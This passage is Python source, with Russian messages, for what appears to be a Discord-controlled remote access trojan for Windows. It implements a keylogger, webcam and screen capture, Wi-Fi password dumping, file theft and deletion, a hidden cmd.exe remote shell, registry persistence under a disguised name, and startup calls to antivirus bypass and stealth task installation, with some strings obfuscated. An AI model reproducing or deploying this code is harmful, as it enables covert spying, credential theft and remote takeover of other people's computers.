            tk.Label(r, text="На вашем устройстве возникла проблема...\n\nВыполнено: 100%\nКод остановки: CRITICAL_PROCESS_DIED", fg="white", bg="#0078d7", font=("Segoe UI", 22), justify="left").place(x=150, y=340)
            r.after(max(1, seconds) * 1000, r.destroy)
            r.mainloop()
        except: pass
    threading.Thread(target=_show, daemon=True).start()
    await ctx.send(f"BSOD на {seconds} сек.")

@bot.command()
async def banner(ctx, *, payload: str):
    parts = payload.split("|", 1)
    cap = parts[0].strip() if len(parts) > 0 else "Предупреждение"
    txt = parts[1].strip() if len(parts) > 1 else ""
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "legalnoticecaption", 0, winreg.REG_SZ, cap)
        winreg.SetValueEx(k, "legalnoticetext", 0, winreg.REG_SZ, txt)
        winreg.CloseKey(k)
        await ctx.send("Баннер установлен.")
    except PermissionError: await ctx.send("Нужны права Админа.")
    except Exception as e: await ctx.send(f"Ошибка: {e}")

@bot.command()
async def clip_get(ctx):
    proc = _sp_run(["powershell", "-NoProfile", "-Command", "Get-Clipboard"], capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000)
    val = proc.stdout.strip() or "[Пусто]"
    await safe_send(ctx, f"Буфер:\n```\n{val}\n```", filename="clip.txt")

@bot.command()
async def clip_set(ctx, *, text: str):
    safe_text = text.replace("'", "''")
    _sp_run(["powershell", "-NoProfile", "-Command", f"Set-Clipboard -Value '{safe_text}'"], creationflags=0x08000000)
    await ctx.send("Буфер обновлен.")

@bot.command()
async def off(ctx):
    await ctx.send("Выключение...")
    _sp_Popen('shutdown /s /t 3 /c "Завершение работы"', shell=True, creationflags=0x08000000)

@bot.command()
async def stop(ctx):
    _kb.unhook_all()
    ctypes.windll.user32.SwapMouseButton(False)
    await ctx.send("Остановлен до ребута.")
    await bot.close()
    os._exit(0)

@bot.command()
async def uninstall(ctx):
    uninstall_stealth_task()
    await ctx.send("Удалено.")
    await bot.close()
    os._exit(0)

# ─── KEYLOGGER ─────────────────────────────────────────────────────────────────
_keylog_buf: list = []
_keylog_active = False
_screen_task_running = False

def _kl_on_press(e):
    global _keylog_buf
    try:
        name = e.name
        if len(name) == 1:
            _keylog_buf.append(name)
        else:
            _keylog_buf.append(f"[{name}]")
    except Exception: pass

@bot.command()
async def kl_start(ctx):
    global _keylog_active, _keylog_buf
    if _keylog_active:
        await ctx.send("Кейлоггер уже запущен.")
        return
    _keylog_buf = []
    getattr(_kb, _d([197, 196, 245, 218, 216, 207, 217, 217]))(_kl_on_press)  # on_press
    _keylog_active = True
    await ctx.send("Кейлоггер запущен. `!kl_dump` — забрать лог, `!kl_stop` — остановить.")

@bot.command()
async def kl_stop(ctx):
    global _keylog_active
    _kb.unhook_all()
    _keylog_active = False
    await ctx.send("Кейлоггер остановлен.")

@bot.command()
async def kl_dump(ctx):
    global _keylog_buf
    if not _keylog_buf:
        await ctx.send("Лог пуст.")
        return
    text = "".join(_keylog_buf)
    _keylog_buf = []
    await safe_send(ctx, text, filename="keylog.txt")

# ─── WEBCAM ────────────────────────────────────────────────────────────────────
@bot.command()
async def cam(ctx, frames: int = 1):
    import cv2
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if not cap.isOpened():
        await ctx.send("Веб-камера недоступна.")
        return
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
    for i in range(min(frames, 5)):
        for _ in range(5): cap.read()
        ok, frame = cap.read()
        if not ok:
            await ctx.send(f"Кадр {i+1}: не удалось.")
            continue
        buf = io.BytesIO()
        ok2, enc = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
        if not ok2:
            await ctx.send(f"Кадр {i+1}: ошибка кодирования.")
            continue
        buf.write(enc.tobytes())
        buf.seek(0)
        await ctx.send(f"Кадр {i+1}/{min(frames,5)}", file=_dc.File(buf, filename=f"cam_{i+1}.jpg"))
    cap.release()

@bot.command()
async def cam_list(ctx):
    import cv2
    found = []
    for idx in range(5):
        cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
        if cap.isOpened():
            found.append(f"Камера {idx}")
            cap.release()
    await ctx.send("\n".join(found) if found else "Камер не найдено.")

# ─── АВТО-СКРИН ────────────────────────────────────────────────────────────────
@bot.command()
async def screen_loop(ctx, interval: int = 30):
    global _screen_task_running
    if interval == 0:
        _screen_task_running = False
        await ctx.send("Авто-скрин остановлен.")
        return
    if _screen_task_running:
        await ctx.send(f"Уже запущен. Останови: `!screen_loop 0`")
        return
    _screen_task_running = True
    interval = max(5, min(interval, 3600))
    await ctx.send(f"Авто-скрин каждые {interval}с. Стоп: `!screen_loop 0`")
    async def _loop():
        global _screen_task_running
        while _screen_task_running:
            try:
                img = ImageGrab.grab()
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=70)
                buf.seek(0)
                await ctx.send(file=_dc.File(buf, filename="auto.jpg"))
            except Exception as e:
                await ctx.send(f"Скрин ошибка: {e}")
            await asyncio.sleep(interval)
    asyncio.ensure_future(_loop())

# ─── ФАЙЛОВЫЙ МЕНЕДЖЕР ─────────────────────────────────────────────────────────
@bot.command()
async def ls(ctx, *, path: str = "."):
    try:
        entries = []
        p = Path(path)
        for e in sorted(p.iterdir()):
            tag = "[DIR] " if e.is_dir() else "      "
            size = "" if e.is_dir() else f"  {e.stat().st_size:>12,} б"
            entries.append(f"{tag}{e.name}{size}")
        text = f"📂 {p.resolve()}\n" + "\n".join(entries[:100])
        await safe_send(ctx, text, filename="ls.txt")
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

@bot.command()
async def dl(ctx, *, path: str):
    try:
        fp = Path(path)
        if not fp.exists():
            await ctx.send("Файл не найден.")
            return
        if fp.stat().st_size > 25 * 1024 * 1024:
            await ctx.send("Файл > 25 МБ, слишком большой для Discord.")
            return
        await ctx.send(file=_dc.File(str(fp), filename=fp.name))
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

@bot.command()
async def ul(ctx):
    if not ctx.message.attachments:
        await ctx.send("Прикрепи файл к сообщению.")
        return
    att = ctx.message.attachments[0]
    dest = Path(tempfile.gettempdir()) / att.filename
    import urllib.request as _ur
    _ur.urlretrieve(att.url, dest)
    await ctx.send(f"Загружен: `{dest}`")

@bot.command()
async def rm(ctx, *, path: str):
    try:
        p = Path(path)
        if p.is_dir():
            shutil.rmtree(p)
        else:
            p.unlink()
        await ctx.send(f"Удалено: `{path}`")
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

# ─── WIFI ПАРОЛИ ───────────────────────────────────────────────────────────────
@bot.command()
async def wifi(ctx):
    try:
        result = _sp_run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, encoding="cp866", errors="replace",
            creationflags=0x08000000
        )
        profiles = [
            line.split(":")[1].strip()
            for line in result.stdout.splitlines()
            if ":" in line and ("All User Profile" in line or "Профиль всех пользователей" in line or "Профиль" in line)
        ]
        lines = []
        for profile in profiles:
            try:
                r = _sp_run(
                    ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                    capture_output=True, text=True, encoding="cp866", errors="replace",
                    creationflags=0x08000000
                )
                passwd = ""
                for l in r.stdout.splitlines():
                    if "Key Content" in l or "Содержимое ключа" in l:
                        passwd = l.split(":", 1)[-1].strip()
                        break
                lines.append(f"SSID: {profile:<30} PASS: {passwd or '(нет)'}")
            except Exception:
                lines.append(f"SSID: {profile:<30} PASS: (ошибка)")
        await safe_send(ctx, "\n".join(lines) if lines else "Сетей не найдено.", filename="wifi.txt")
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

# ─── PERSIST ЧЕРЕЗ РЕЕСТР ──────────────────────────────────────────────────────
@bot.command()
async def persist_reg(ctx):
    try:
        exe = sys.executable
        _cand = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Windows", "Diagnostics", "svchost_diag.dat")
        if "__file__" in dir() and os.path.exists(__file__):
            script = os.path.abspath(__file__)
            value = f'"{exe}" -W ignore "{script}"'
        elif os.path.exists(_cand):
            value = f'"{exe}" -W ignore -c "exec(open(r\'{_cand}\', encoding=\'utf-8\').read())"'
        else:
            _fallback = os.path.join(tempfile.gettempdir(), "svchost_diag.dat")
            value = f'"{exe}" -W ignore -c "exec(open(r\'{_fallback}\', encoding=\'utf-8\').read())"'
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsHostHelper", 0, winreg.REG_SZ, value)
        winreg.CloseKey(k)
        await ctx.send("Добавлен в HKCU\\Run как `WindowsHostHelper`.")
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

@bot.command()
async def persist_remove(ctx):
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(k, "WindowsHostHelper")
        winreg.CloseKey(k)
        await ctx.send("Удалено из HKCU\\Run.")
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

# ─── REVERSE SHELL ─────────────────────────────────────────────────────────────
_shell_proc = None

@bot.command()
async def shell_start(ctx):
    global _shell_proc
    if _shell_proc and _shell_proc.poll() is None:
        await ctx.send("Shell уже запущен. `!sh <команда>` для ввода.")
        return
    _shell_proc = _sp_Popen(
        ["cmd.exe"],
        stdin=_sp_PIPE, stdout=_sp_PIPE, stderr=_sp_STDOUT,
        creationflags=0x08000000, text=True, encoding="cp866", errors="replace"
    )
    await ctx.send("Shell запущен. `!sh <команда>` — ввод, `!shell_stop` — выход.")

@bot.command()
async def sh(ctx, *, command: str):
    global _shell_proc
    if not _shell_proc or _shell_proc.poll() is not None:
        await ctx.send("Shell не запущен. `!shell_start`")
        return
    import msvcrt
    _shell_proc.stdin.write(command + "\n")
    _shell_proc.stdin.flush()
    await asyncio.sleep(0.8)
    output = []
    while True:
        try:
            if msvcrt.kbhit():
                break
            line = _shell_proc.stdout.readline()
            if not line:
                break
            output.append(line)
            if len(output) > 50:
                break
        except Exception:
            break
    text = "".join(output).strip() or "(нет вывода)"
    await safe_send(ctx, f"```\n{text}\n```", filename="shell_out.txt")

@bot.command()
async def shell_stop(ctx):
    global _shell_proc
    if _shell_proc:
        _shell_proc.kill()
        _shell_proc = None
    await ctx.send("Shell остановлен.")

# ─── SYSINFO & EXTRA TOOLS ─────────────────────────────────────────────────────
@bot.command()
async def ping(ctx):
    ms = round(bot.latency * 1000) if bot.latency else 0
    embed = _dc.Embed(description=f"🏓 Понг! Задержка Discord шлюза: **{ms} ms**", color=0x2ecc71)
    await ctx.send(embed=embed)

@bot.command()
async def vol(ctx, level: int = -1):
    try:
        val = await asyncio.to_thread(get_set_volume, level)
        if val < 0:
            return await ctx.send("⚠️ Ошибка: устройство воспроизведения недоступно.")
        if level >= 0:
            embed = _dc.Embed(description=f"🔊 Системная громкость установлена на **{val}%**", color=0x2ecc71)
        else:
            embed = _dc.Embed(description=f"🔈 Текущая системная громкость: **{val}%**", color=0x5865F2)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

@bot.command()
async def top(ctx):
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'memory_info']):
            try:
                mem = p.info['memory_info'].rss / (1024 * 1024)
                procs.append((p.info['name'] or 'unknown', p.info['pid'], mem))
            except Exception: pass
        procs.sort(key=lambda x: x[2], reverse=True)
        top_list = procs[:8]
        lines = [f"{'PID':<7} {'Память':<10} {'Имя процесса'}"]
        lines.append("─" * 38)
        for name, pid, mem in top_list:
            lines.append(f"{pid:<7} {mem:>7.1f} МБ  {name}")
        embed = _dc.Embed(title="📊 Топ процессов по памяти", color=0x5865F2)
        embed.description = "```asciidoc\n" + "\n".join(lines) + "\n```"
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

@bot.command()
async def sysinfo(ctx):
    try:
        def pbar(pct, length=10):
            filled = int(length * max(0, min(100, pct)) / 100)
            return "█" * filled + "░" * (length - filled)

        cpu = _sp_run(["wmic","cpu","get","Name","/value"], capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000).stdout.strip().replace("Name=", "").strip()
        os_cap = _sp_run(['wmic','os','get','Caption','/value'], capture_output=True, text=True, encoding='cp866', errors='replace', creationflags=0x08000000).stdout.strip().replace("Caption=", "").strip()
        vmem = psutil.virtual_memory()
        ram_gb = round(vmem.total / (1024**3), 1)
        ram_used = round(vmem.used / (1024**3), 1)
        ram_pct = int(vmem.percent)
        
        disk = psutil.disk_usage("/")
        disk_pct = int(disk.percent)
        disk_used = round(disk.used / (1024**3), 1)
        disk_total = round(disk.total / (1024**3), 1)

        _k = 0xAA
        uptime_sec = int(ctypes.WinDLL(bytes(x^_k for x in [193,207,216,196,207,198,153,152]).decode()).GetTickCount64() // 1000)
        h, m = divmod(uptime_sec // 60, 60)
        d, h = divmod(h, 24)
        uptime_str = f"{d}д {h}ч {m}м" if d else f"{h}ч {m}м"

        embed = _dc.Embed(title="💻 Системная сводка узла", color=0x5865F2)
        embed.add_field(name="👤 Узел", value=f"`{os.environ.get('COMPUTERNAME','?')}\\{os.environ.get('USERNAME','?')}`", inline=True)
        embed.add_field(name="🪟 ОС", value=f"`{os_cap or 'Windows'}`", inline=True)
        embed.add_field(name="⏱️ Аптайм", value=f"`{uptime_str}`", inline=True)
        embed.add_field(name="🧠 Процессор", value=f"`{cpu or 'N/A'}`", inline=False)
        embed.add_field(name=f"ОЗУ: {ram_used} / {ram_gb} ГБ ({ram_pct}%)", value=f"`[{pbar(ram_pct)}]`", inline=True)
        embed.add_field(name=f"Диск C: {disk_used} / {disk_total} ГБ ({disk_pct}%)", value=f"`[{pbar(disk_pct)}]`", inline=True)
        
        ip_info = _sp_run(["ipconfig"], capture_output=True, text=True, encoding="cp866", errors="replace", creationflags=0x08000000).stdout
        embed.add_field(name="🌐 Сетевые интерфейсы", value=f"```dos\n{ip_info[:700]}\n```", inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Ошибка: {e}")

def run_resilient():
    while True:
        try:
            bot._closed = False
            bot._closing_task = None
            if hasattr(bot, "http") and hasattr(_dc.utils, "MISSING"):
                bot.http.connector = _dc.utils.MISSING
            bot.run(BOT_TOKEN, log_handler=None)
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    single_instance_guard()
    if check_environment():
        bypass_av_memory()
        disable_audio_ducking()
        install_stealth_task()
        threading.Thread(target=ensure_voice_deps, daemon=True).start()
        threading.Thread(target=keep_self_unmuted, daemon=True).start()
        run_resilient()
